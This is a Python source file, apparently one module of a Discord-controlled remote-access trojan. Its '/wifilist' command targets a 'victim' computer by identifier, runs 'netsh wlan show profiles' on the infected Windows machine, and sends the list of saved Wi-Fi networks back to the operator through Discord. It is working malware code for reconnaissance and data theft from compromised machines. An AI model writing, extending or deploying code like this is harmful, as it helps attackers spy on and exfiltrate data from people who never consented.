import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, re, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class WifiList(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command( )
    async def wifilist(self, ctx, victim):
        """Lists all wifi networks
    
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if str(victim) != str(self.bot.identifier):
            return
        ssids = []
        output = os.popen("netsh wlan show profiles").read()
        profiles = re.findall(r"All User Profile\s(.*)", output)
        for profile in profiles:
            ssid = profile.strip().strip(":").strip()
            ssids.append(ssid)

        msg = "".join(
            f"{i}) {ssid}\n" for i, ssid in zip(range(1, len(ssids) + 1), ssids)
        )
        if len(msg) >= 4000:
            return await ctx.response.send_message(f"All saved wifi networks:```{msg}```")

        await ctx.response.send_message(
            embed=self.bot.genEmbed(
                "All saved wifi networks:", 
                datetime.now(), msg
            )
        )

def setup(bot: commands.Bot):
    bot.add_cog(WifiList(bot))